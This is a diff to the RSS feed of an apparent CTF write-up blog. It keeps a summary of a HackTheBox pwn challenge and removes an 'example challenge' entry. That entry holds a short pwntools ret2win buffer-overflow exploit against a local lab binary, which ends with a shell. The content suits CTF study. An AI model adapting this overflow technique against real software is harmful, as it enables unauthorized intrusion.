@@ -57,12 +57,5 @@
       <guid>https://mlowlevl.xyz/writeups/pwn/you-know-0xdiablos-htb/</guid>
       <description>Initial Recon First I ran my tool tio to get some basic information about the program.&#xA;After that I started the program to see what happens.&#xA;The program starts with a simple banner (You know who are 0xDiablos) and an input field. When you type something into the input field, it just gets echoed back.&#xA;Source Code Analysis Since no source code was provided, I tried to disassemble the program in Ghidra.</description>
     </item>
-    <item>
-      <title>example challenge</title>
-      <link>https://mlowlevl.xyz/writeups/pwn/example-challenge/</link>
-      <pubDate>Thu, 15 Jan 2026 00:00:00 +0000</pubDate>
-      <guid>https://mlowlevl.xyz/writeups/pwn/example-challenge/</guid>
-      <description>challenge basic buffer overflow with no PIE and no canary. ret2win.&#xA;solution from pwn import * p = process(&amp;#39;./vuln&amp;#39;) payload = b&amp;#39;A&amp;#39; * 72 + p64(0x401196) p.sendline(payload) p.interactive() got shell.</description>
-    </item>
   </channel>
 </rss>
